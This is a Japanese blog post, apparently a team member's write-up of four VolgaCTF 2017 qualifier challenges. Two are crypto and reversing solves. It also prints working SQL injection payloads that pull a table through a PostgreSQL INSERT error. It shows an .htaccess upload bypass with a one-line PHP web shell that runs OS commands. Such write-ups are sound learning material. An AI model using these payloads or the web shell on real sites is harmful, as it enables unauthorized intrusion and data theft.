---
layout: post
title: VolgaCTF 2017 Quals の write-up
categories: [ctf]
date: 2017-03-28 02:04:00 +0900
---

チーム Harekaze で [VolgaCTF 2017 Quals](https://quals.2017.volgactf.ru/) に参加しました。最終的にチームで 1050 点を獲得し、順位は 61 位 (得点 677 チーム中) でした。うち、私は 3 問を解いて 450 点を入れました。

以下、解いた問題の write-up です。

## [Crypto/Reverse 150] PyCrypto

`pycryptography.so` と `encrypt.py` が渡されます。

`from pycryptography import encrypt` のように import して `encrypt(b'ABCD', b'EFGH')` を実行してみると `b'\x04\x04\x04\x0c'` が返ってきました。xor です。

あとは

```python
def xor(a, b):
  res = ''
  if len(a) < len(b):
    a, b = b, a
  for k, c in enumerate(a):
    res += chr(ord(c) ^ ord(b[k % len(b)]))
  return res

s = open('flag.enc', 'rb').read()
k = '\x94\xffc\xa3\x8du\xd8\xc4\x1a\xc1\xca$\x1ef\x0c\x1f\xc6\xe2\xcc\xea'

for block in [s[x:x+20] for x in range(0, len(s), 20)]:
  print repr(xor(block, k)), repr(block)

print repr(xor(s, k))
```

というようなスクリプトを書いて、平文を推測しながら少しずつ鍵を特定しました。

```
VolgaCTF{N@me_is_Pad_Many_Times_P@d_Mi$$_me?}
```

## [Reverse 100] KeyPass

`keypass` という x86_64 の ELF と `flag.zip.enc` という暗号化された zip が渡されます。

`./keypass abcd` を実行すると `wvUauol2)+ot+>Q+v` が出力されました。問題文によると `flag.zip.enc` は OpenSSL 1.1.0e を使って、`keypass` で出力された文字列を鍵に aes-128-cbc で暗号化されたようです。

`keypass` を見てみると、どうやら

```
  4004e8:       48 0f be 07             movsx  rax,BYTE PTR [rdi] # rdi == argv[1]
  4004ec:       48 83 c7 01             add    rdi,0x1
  4004f0:       48 31 c2                xor    rdx,rax
  4004f3:       48 39 cf                cmp    rdi,rcx
  4004f6:       75 f0                   jne    4004e8 <__libc_start_main@plt+0x68>
```

と結局鍵は 256 通りに絞られてしまうようです。

あとは

```c
#include <stdio.h>
#include <unistd.h>
int main(int argc, char **argv) {
  int i;
  char s[2] = {0};
  s[0] = atoi(argv[1]);
  execl("./keypass", "./keypass", s);
  return 0;
}
```

これを `gcc a.c -o a` でコンパイルして

```python
from subprocess import *
for x in range(256):
  pwd = check_output(['./a', str(x)]).strip()
  try:
    p = Popen(['openssl', 'aes-128-cbc', '-d', '-in', 'flag.zip.enc', '-pass', 'pass:%s' % pwd], stdin=PIPE, stdout=PIPE, stderr=PIPE)
    stdout, stderr = p.communicate()
    if 'PK' in stdout:
      open('flag.zip', 'wb').write(stdout)
  except Exception as e:
    print e
```

を実行すると `flag.zip.enc` を復号できました。

```
VolgaCTF{L0ve_a11_trust_@_few_d0_not_reinvent_the_wh33l}
```

## [Web 100] Bloody Feedback

与えられた URL にアクセスすると、名前とメールアドレスとメッセージを送ることができるフォームが表示されました。

適当に入力すると `JE5FbsE93ewj1CeH1Ked4ocewS4YcLe6` という感じのコードが発行されました。これを使ってメッセージが処理されたかどうかのステータスを見ることができるようです。が、どれだけ待ってもステータスは `not processed` から変わりません。

試しにメールアドレスに `'` を入力してみると

```
ERROR: DBD::Pg::db do failed: ERROR: syntax error at or near "not" LINE 1: ...c2ccXSfdWxhzPUwrREWp92HVq7UZ3','hoge','fuga',''','not proces... ^ at Worker.pm  line 29.
```

というエラーが発生しました。どうやら insert 文で SQLi ができるようです。また、`DBD::Pg::db` から DB が PostgreSQL であることが分かりました。

メールアドレスに `',  (select table_name from information_schema.tables limit 1 offset 1));--` を入力すると `s3cret_tabl3` と出力されました。  
また、`',  (select column_name from information_schema.columns where table_name like 's3cret_tabl3' limit 1));--` で `s3cret_tabl3` は `s3cr3tc0lumn` というカラムを持つと分かりました。

あとは `,  (select s3cr3tc0lumn from s3cret_tabl3 limit 1 offset 4));--` でフラグが表示されました。

```
VolgaCTF{eiU7UJhyeu@ud3*}
```

## ([Web 200] Share Point)

与えられた URL にアクセスすると、ファイルのアップロードができ、さらにそれを他のユーザと共有できる Web サービスが動いていました。

いろいろ試していると拡張子が `php` や `html` だとアップロードできない様子でした。

ですが、`.htaccess` はアップロードできるようです。

```
AddHandler php5-script .hoge
```

という内容の `.htaccess` というファイルと

```php
<?php passthru($_GET['cmd']);
```

という内容の `a.hoge` というファイルをアップロードすると、`a.hoge?cmd=ls` のようにして任意の OS コマンドが実行できるようになりました。

どこにフラグがあるか延々悩んでいたのですが、[@zeosutt](https://twitter.com/zeosutt) さんが `/opt/flag.txt` にフラグを見つけていました。
